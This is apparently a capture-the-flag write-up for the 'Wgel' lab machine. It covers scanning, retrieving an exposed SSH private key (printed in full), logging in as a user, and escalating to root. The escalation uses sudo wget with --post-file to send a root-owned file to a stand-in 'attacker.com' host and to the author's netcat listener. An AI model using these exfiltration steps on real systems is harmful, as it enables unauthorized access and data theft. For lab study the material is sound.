# Wgel CTF

## #1 - User flag

Let's start by scanning the IP with nmap:

~~~
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
~~~

2 ports are open: ssh and http, both on standard ports. Let's start with http.

* No `robots.txt` file (http://10.10.251.64/robots.txt)
* When you connect, the default Apache welcome page is displayed, but there is something wrong in it. We'll see that in a moment
* dirsearch discovers a `/sitemap` directory:

~~~
$ /data/src/dirsearch/dirsearch.py -u http://10.10.251.64 -E -w /data/src/wordlists/common.txt 

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, js, html, do, action | HTTP method: get | Threads: 10 | Wordlist size: 4614

Error Log: /data/src/dirsearch/logs/errors-20-05-13_23-05-49.log

Target: http://10.10.251.64

[23:05:49] Starting: 
[23:05:50] 200 -   11KB - /
[23:05:50] 403 -  278B  - /.hta
[23:06:01] 200 -   11KB - /index.html
[23:06:09] 403 -  278B  - /server-status
[23:06:10] 301 -  316B  - /sitemap  ->  http://10.10.251.64/sitemap/

Task Completed
~~~

* Connecting to http://10.10.251.64/sitemap/ shows a blog. It seems to be a wordpress installation using the unapp theme from colorlib, but it's actually a fake wordpress installation (no `wp-login` or `wp-admin` path, all links are fake). Let's confirm what directories we have under `/sitemap/`:

~~~
$ /data/src/dirsearch/dirsearch.py -u http://10.10.251.64/sitemap -E -w /data/src/wordlists/common.txt 

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, js, html, do, action | HTTP method: get | Threads: 10 | Wordlist size: 4614

Error Log: /data/src/dirsearch/logs/errors-20-05-13_23-04-09.log

Target: http://10.10.251.64/sitemap

[23:04:09] Starting: 
[23:04:10] 403 -  278B  - /sitemap/.hta
[23:04:10] 200 -   21KB - /sitemap/
[23:04:10] 301 -  321B  - /sitemap/.ssh  ->  http://10.10.251.64/sitemap/.ssh/
[23:04:16] 301 -  320B  - /sitemap/css  ->  http://10.10.251.64/sitemap/css/
[23:04:19] 301 -  322B  - /sitemap/fonts  ->  http://10.10.251.64/sitemap/fonts/
[23:04:21] 301 -  323B  - /sitemap/images  ->  http://10.10.251.64/sitemap/images/
[23:04:21] 200 -   21KB - /sitemap/index.html
[23:04:22] 301 -  319B  - /sitemap/js  ->  http://10.10.251.64/sitemap/js/

Task Completed
~~~

Interesting... we have a hidden `.ssh/` directory, and it contains a private key. Let's get it:

~~~
$ curl http://10.10.251.64/sitemap/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x
W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP
y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr
+J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH
Wo/Lmln4FLzLb1T31pOoTtTKuUQWxHf7cN8v6QIDAQABAoIBAFZDKpV2HgL+6iqG
/1U+Q2dhXFLv3PWhadXLKEzbXfsAbAfwCjwCgZXUb9mFoNI2Ic4PsPjbqyCO2LmE
AnAhHKQNeUOn3ymGJEU9iJMJigb5xZGwX0FBoUJCs9QJMBBZthWyLlJUKic7GvPa
M7QYKP51VCi1j3GrOd1ygFSRkP6jZpOpM33dG1/ubom7OWDZPDS9AjAOkYuJBobG
SUM+uxh7JJn8uM9J4NvQPkC10RIXFYECwNW+iHsB0CWlcF7CAZAbWLsJgd6TcGTv
2KBA6YcfGXN0b49CFOBMLBY/dcWpHu+d0KcruHTeTnM7aLdrexpiMJ3XHVQ4QRP2
p3xz9QECgYEA+VXndZU98FT+armRv8iwuCOAmN8p7tD1W9S2evJEA5uTCsDzmsDj
7pUO8zziTXgeDENrcz1uo0e3bL13MiZeFe9HQNMpVOX+vEaCZd6ZNFbJ4R889D7I
dcXDvkNRbw42ZWx8TawzwXFVhn8Rs9fMwPlbdVh9f9h7papfGN2FoeECgYEA4EIy
GW9eJnl0tzL31TpW2lnJ+KYCRIlucQUnBtQLWdTncUkm+LBS5Z6dGxEcwCrYY1fh
shl66KulTmE3G9nFPKezCwd7jFWmUUK0hX6Sog7VRQZw72cmp7lYb1KRQ9A0Nb97
uhgbVrK/Rm+uACIJ+YD57/ZuwuhnJPirXwdaXwkCgYBMkrxN2TK3f3LPFgST8K+N
LaIN0OOQ622e8TnFkmee8AV9lPp7eWfG2tJHk1gw0IXx4Da8oo466QiFBb74kN3u
QJkSaIdWAnh0G/dqD63fbBP95lkS7cEkokLWSNhWkffUuDeIpy0R6JuKfbXTFKBW
V35mEHIidDqtCyC/gzDKIQKBgDE+d+/b46nBK976oy9AY0gJRW+DTKYuI4FP51T5
hRCRzsyyios7dMiVPtxtsomEHwYZiybnr3SeFGuUr1w/Qq9iB8/ZMckMGbxoUGmr
9Jj/dtd0ZaI8XWGhMokncVyZwI044ftoRcCQ+a2G4oeG8ffG2ZtW2tWT4OpebIsu
eyq5AoGBANCkOaWnitoMTdWZ5d+WNNCqcztoNppuoMaG7L3smUSBz6k8J4p4yDPb
QNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy/onH6X1T5OAAW6/UXc4S7Vsg
jL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod
-----END RSA PRIVATE KEY-----
~~~

Let's check if it is password protected:

~~~
$ /data/src/john/run/ssh2john.py id_rsa
id_rsa has no password!
~~~

No, it's not. However, to use it, we need to know what user is associated to this key.

Back to the Apache default webpage, we notice that there is somethin wrong. See the comparison between these 2 screenshots (our default page on the left, a standard Apache default page on the right).

!["apache default page"](files/apache-default-page.png)

Let's have a closer look at the source code of the page:

```html
$ curl -s http://10.10.251.64/

...[SNIP]...

          <pre>
/etc/apache2/
|-- apache2.conf
|       `--  ports.conf
|-- mods-enabled
|       |-- *.load
|       `-- *.conf
|-- conf-enabled
|       `-- *.conf
|-- sites-enabled
|       `-- *.conf


 <!-- Jessie don't forget to udate the webiste -->
          </pre>

...[SNIP]...

```

The offset is due to a comment that has been added to the page: `Jessie don't forget to udate the webiste`. The typo (`webiste` instead of `website`) is another indication that it has probably been manually added. Could `Jessie` be the user we are looking for?

Let's check:

~~~
$ chmod 600 id_rsa
$ ssh -i id_rsa jessie@10.10.251.64
~~~

It works! We are now connected.

Our flag is in the `Documents` folder:

~~~
jessie@CorpOne:~$ ls -l
total 44
drwxr-xr-x 2 jessie jessie 4096 oct 26  2019 Desktop
drwxr-xr-x 2 jessie jessie 4096 oct 26  2019 Documents
drwxr-xr-x 2 jessie jessie 4096 oct 26  2019 Downloads
-rw-r--r-- 1 jessie jessie 8980 oct 26  2019 examples.desktop
drwxr-xr-x 2 jessie jessie 4096 oct 26  2019 Music
drwxr-xr-x 2 jessie jessie 4096 oct 26  2019 Pictures
drwxr-xr-x 2 jessie jessie 4096 oct 26  2019 Public
drwxr-xr-x 2 jessie jessie 4096 oct 26  2019 Templates
drwxr-xr-x 2 jessie jessie 4096 oct 26  2019 Videos
jessie@CorpOne:~$ ls -l Desktop/
total 0
jessie@CorpOne:~$ ls -l Documents/
total 4
-rw-rw-r-- 1 jessie jessie 33 oct 26  2019 user_flag.txt
jessie@CorpOne:~$ cat Documents/user_flag.txt 
057c67131c3d5e42dd5cd3075b198ff6
~~~

## #2 - Root flag

~~~
jessie@CorpOne:~$ ls -l /root/
ls: cannot open directory '/root/': Permission denied
~~~

We need to elevate our privileges. Let's start by checking our privileges:

~~~
jessie@CorpOne:~$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
~~~

We can run `wget` as `root` without password. Let's check [here](https://gtfobins.github.io/gtfobins/wget/) what we can do with it.

We can upload a file with sudo access:

```bash
export URL=http://attacker.com/
export LFILE=file_to_send
wget --post-file=$LFILE $URL
```

As the first flag was named `user_flag.txt`, the root flag will likely be `root_flag.txt`. Let's try... First open a listener on your local machine:

~~~
$ nc -nlvp 1234
~~~

And on the remote machine, enter the following command:

~~~
jessie@CorpOne:~$ sudo wget --post-file=/root/root_flag.txt 10.9.**.**:1234
--2020-05-14 09:11:19--  http://10.9.**.**:1234/
Connecting to 10.9.**.**:1234... connected.
HTTP request sent, awaiting response...
~~~

We now get the flag: `b1b968b37519ad1daa6408188649263d`
